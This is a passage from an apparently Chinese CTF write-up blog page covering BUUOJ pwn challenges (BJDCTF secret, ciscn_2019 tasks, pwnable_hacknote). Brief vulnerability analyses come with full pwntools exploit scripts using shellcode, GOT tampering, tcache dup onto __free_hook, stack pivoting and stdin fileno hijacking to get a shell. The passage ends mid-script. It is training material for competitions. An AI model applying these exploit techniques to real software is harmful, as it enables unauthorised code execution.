uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
<span class="hljs-comment"># debug()</span>
payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)
sa(<span class="hljs-string">":"</span>,payload)
new_esp = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">4</span>
addr_shellcode = new_esp + <span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>
info_addr(<span class="hljs-string">'new esp'</span>,new_esp)
shellcode  = <span class="hljs-string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>
shellcode += <span class="hljs-string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>
shellcode += <span class="hljs-string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>
shellcode += <span class="hljs-string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span>
s(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(addr_shellcode) + shellcode)
itr()</code></pre></div>

<p>Shell code 网上一找有很多，找到一个合适字节限制，且可以执行的即可。</p>
<h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>做法跟 <code>cmcc_simplerop</code>基本一样，除了偏移。</p>
<p>32位下，<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> 行不通。（上来测试这个，测试一阵子）</p>
<h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>慢慢分析可以发现一个溢出点，且利用此处只是可以做到任意地址的数据减1。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p>
<p>然后想到可以在got表处下手，<strong>其中printf、system函数在程序达到一定条件才会运行。所以其got处的值是特定的，并且是相近的。</strong></p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p>
<p>如图所示，相差10。然后利用原来的溢出点，放入printf的got表地址，让其减10次1，也就是答对10次serect后，让程序走向结束处，调用printf。其printf的buf打印的是name，这个是可控的，写成<code>/bin/sh\x00</code>即可。</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./secret'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29635</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
payload = <span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">"\x00"</span> * <span class="hljs-number">8</span> + p64(elf.got[<span class="hljs-string">'printf'</span>])[:<span class="hljs-number">5</span>]
<span class="hljs-comment">#此处payload 因为read那里读的数据大小限制，需要调整一下payload的长度。</span>
<span class="hljs-comment"># debug()</span>

sla(<span class="hljs-string">"What's your name?"</span>,payload)
answer = [<span class="hljs-number">0x476B</span>,<span class="hljs-number">0x2D38</span>,<span class="hljs-number">0x4540</span>,<span class="hljs-number">0x3E77</span>,<span class="hljs-number">0x3162</span>,<span class="hljs-number">0x3F7D</span>,<span class="hljs-number">0x357A</span>,<span class="hljs-number">0x3CF5</span>,<span class="hljs-number">0x2F9E</span>,<span class="hljs-number">0x41EA</span>,<span class="hljs-number">0x48D8</span>,<span class="hljs-number">0x2763</span>,<span class="hljs-number">0x474C</span>,<span class="hljs-number">0x3809</span>,<span class="hljs-number">0x2E63</span>]

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(answer)):
    print(answer[i])
    sa(<span class="hljs-string">"Secret"</span>,str(answer[i]))

sla(<span class="hljs-string">"Secret"</span>,<span class="hljs-string">'1'</span>)
itr()</code></pre></div>

<h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>64位，ubuntu 18.  存在 UAF，十分简单的tcache dup攻击。</p>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_2019_es_1'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29639</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    gdb.attach(io)
    pause()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,call)</span>:</span>
    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'name'</span>,str(name))
    sa(<span class="hljs-string">'call'</span>,str(call))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
add(<span class="hljs-number">0x500</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#1</span>
<span class="hljs-comment"># debug()</span>
call(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
ru(<span class="hljs-string">'name:\n'</span>)
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>
info_addr(<span class="hljs-string">'libc'</span>,libc_base)
<span class="hljs-comment">#get libc</span>
add(<span class="hljs-number">0x510</span><span class="hljs-number">-0x20</span><span class="hljs-number">-0x10</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#3</span>
call(<span class="hljs-number">3</span>)
call(<span class="hljs-number">3</span>)
free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>
add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#4</span>
add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#5</span>
rec = rce18[<span class="hljs-number">1</span>] + libc_base
add(<span class="hljs-number">0x20</span>,p64(rec),p64(rec))
call(<span class="hljs-number">1</span>)
itr()</code></pre></div>

<h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vul</span><span class="hljs-params">()</span>
</span>&#123;
  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span>

  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);
  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);
  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);
&#125;</code></pre></div>

<ul>
<li>存在栈溢出，溢出8个字节，考虑栈转移。</li>
<li>在填充buf， <code>%s</code> 在32位用于泄漏栈上的信息。</li>
</ul>
<p>所以可以考虑泄漏处栈地址，libc地址。从而算出buf的base与libc base。</p>
<p>首先可以明确一点可以覆盖返回地址，第一下考虑直接覆盖为<code>one_gadget</code> 本地通远程不通。</p>
<p>然后就考虑用栈转移到buf上来获取shell。</p>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_s_4'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26932</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">1</span> ) + <span class="hljs-string">'b'</span>
sa(<span class="hljs-string">'name'</span>,payload)
ru(<span class="hljs-string">"b"</span>)
buf_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x38</span>
r(<span class="hljs-number">4</span>)
libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1fb9b0</span>
info_addr(<span class="hljs-string">'stack'</span>,buf_base)
info_addr(<span class="hljs-string">'libc'</span>,libc_base)
payload = p32(<span class="hljs-number">0x8048450</span>) + p32(elf.plt[<span class="hljs-string">'system'</span>]) + p32(<span class="hljs-number">0x8048450</span>) + p32(buf_base+<span class="hljs-number">16</span>) + <span class="hljs-string">'/bin/sh\x00'</span>
payload = payload.ljust((<span class="hljs-number">0x30</span><span class="hljs-number">-4</span><span class="hljs-number">-4</span><span class="hljs-number">-8</span>),<span class="hljs-string">'b'</span>) + p32(buf_base) *<span class="hljs-number">3</span>+ p32(<span class="hljs-number">0x80485FD</span>)
s(payload)
itr()</code></pre></div>

<h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是也很细节，由于自己的逆向能力有点差，没有注意部分细节，造成构造堆块，进行leak和改写时，造成较大的困难和迷惑。</p>
<p>开启了沙盒不能get shell：</p>
<div class="hljs"><pre><code class="hljs undefined">#  line  CODE  JT   JF      K
# =================================
#  <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch
#  <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0007</span>
#  <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number
#  <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span>
#  <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) goto <span class="hljs-number">0007</span>
#  <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0007</span>
#  <span class="hljs-number">0006</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW
#  <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div>

<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul>
<li>UAF</li>
</ul>
<p>比如：</p>
<h4 id="程序处："><a href="#程序处：" class="headerlink" title="程序处："></a>程序处：</h4><h5 id="add函数："><a href="#add函数：" class="headerlink" title="add函数："></a>add函数：</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> *v0; <span class="hljs-comment">// rbx</span>
__int16 v1; <span class="hljs-comment">// ax</span></code></pre></div>

<div class="hljs"><pre><code class="hljs c">v0 = (<span class="hljs-keyword">int</span> *)int_pt;
*v0 = get_atoi();
*((_DWORD *)int_pt + <span class="hljs-number">2</span>) = *(_DWORD *)int_pt;</code></pre></div>

<div class="hljs"><pre><code class="hljs c">v1 = get_atoi();
*(_WORD *)short_pt = v1;
*((_WORD *)short_pt + <span class="hljs-number">4</span>) = *(_WORD *)short_pt;</code></pre></div>

<p>开始对数据类型的大小没有注意，这几处决定着</p>
<ul>
<li>int型堆块时，只能写上4字节的数据</li>
<li>short int 型堆块时，只能写上2字节的数据</li>
</ul>
<h5 id="show函数："><a href="#show函数：" class="headerlink" title="show函数："></a>show函数：</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">1</span> &amp;&amp; int_pt )
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your int type inode number :%d\n"</span>, *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)int_pt);
  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">2</span> &amp;&amp; short_pt )
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your short type inode number :%d\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*(<span class="hljs-keyword">signed</span> __int16 *)short_pt);</code></pre></div>

<p>意味着leak时也是只能泄漏出部分的字节，增加在利用时的难度，需要利用合适的堆块进行攻击，其合适是指上面有残留合适的数据，然后改末尾几个字节。</p>
<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>scanf函数是从stdin中读取数据，且在<code>__IO_2_stdio_</code> 的io结构体存在一个<code>_fileno</code>的标识位，默认值是0，若将其改成其他的文件号，调用scanf函数在获取时，就会获取对应文件。</p>
<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ul>
<li>程序只让你分配0x30或者0x20的堆块，如何伪造出一个至少0x90的堆块，如何释放后，来泄漏libc。</li>
<li>泄漏出来的数据不是完整的，可写时只能写上2、4字节</li>
</ul>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_final_2'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25252</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(type,number)</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'&gt;'</span>,str(type))
    sla(<span class="hljs-string">":"</span>,str(number))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(type)</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'&gt;'</span>,str(type))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(type)</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'&gt;'</span>,str(type))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)
    <span class="hljs-comment"># sa('?',str(mes))</span>


add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)
free(<span class="hljs-number">1</span>) <span class="hljs-comment">#leave chunk 0 </span>
add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 0x90</span>
<span class="hljs-comment">#ready to dup</span>
add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)
free(<span class="hljs-number">2</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># get chunk0</span>
free(<span class="hljs-number">2</span>)
<span class="hljs-comment">#leak heap</span>
show(<span class="hljs-number">2</span>)
ru(<span class="hljs-string">'number :'</span>)
chunk0_addr_word = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0xa0</span>
info_addr(<span class="hljs-string">'chunk0_addr'</span>,chunk0_addr_word)
add(<span class="hljs-number">2</span>,chunk0_addr_word)
add(<span class="hljs-number">2</span>,chunk0_addr_word)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x91</span>) <span class="hljs-comment">#fake unsortbin chunk</span>
<span class="hljs-comment">#full tache bins</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    free(<span class="hljs-number">1</span>)
    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)
<span class="hljs-comment">#leak libc</span>
free(<span class="hljs-number">1</span>)
show(<span class="hljs-number">1</span>)
ru(<span class="hljs-string">'number :'</span>)
stdin_fillno = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x70</span>
info_addr(<span class="hljs-string">'stdin_fillno'</span>,stdin_fillno)

<span class="hljs-comment">#ready to attack stdin_fillno ,use taeche dup</span>

add(<span class="hljs-number">1</span>,stdin_fillno)
add(<span class="hljs-number">1</span>,stdin_fillno)
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">2</span>,stdin_fillno)
free(<span class="hljs-number">1</span>)
<span class="hljs-comment">#leak contains libc's heap</span>
show(<span class="hljs-number">1</span>)
ru(<span class="hljs-string">'number :'</span>)
chunk1_addr_dword = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x30</span>
info_addr(<span class="hljs-string">'chunk1_addr_dword'</span>,chunk1_addr_dword)
<span class="hljs-comment">#change the 0x30bins chains</span>

add(<span class="hljs-number">1</span>,chunk1_addr_dword)
add(<span class="hljs-number">1</span>,chunk1_addr_dword)
add(<span class="hljs-number">1</span>,stdin_fillno)
<span class="hljs-comment">#attck the fileno</span>
add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)

leave()
itr()</code></pre></div>

<p>渣渣英文注释，先不改了。感觉还是挺不容易做的题，堆块如何构造想了老久。到别的师傅那里，归类为简单题。太菜了太菜了，基础还不是很好。</p>
<h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>简单的uaf</p>
<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><div class="hljs"><pre><code class="hljs c">(*(<span class="hljs-keyword">void</span> (__cdecl **)(<span class="hljs-keyword">void</span> *))ptr[v1])(ptr[v1]);</code></pre></div>

<p>此处在改完<code>ptr[v1]</code>为system以后，其参数的指针是从这个堆块开始的要提前进行截断。</p>
<div class="hljs"><pre><code class="hljs c">system(p32(system) + '||sh')
system(p32(system) + ';sh;')</code></pre></div>

<h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./hacknote'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27225</span>)
elf = ELF(local_file)
libc = elf.libc
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
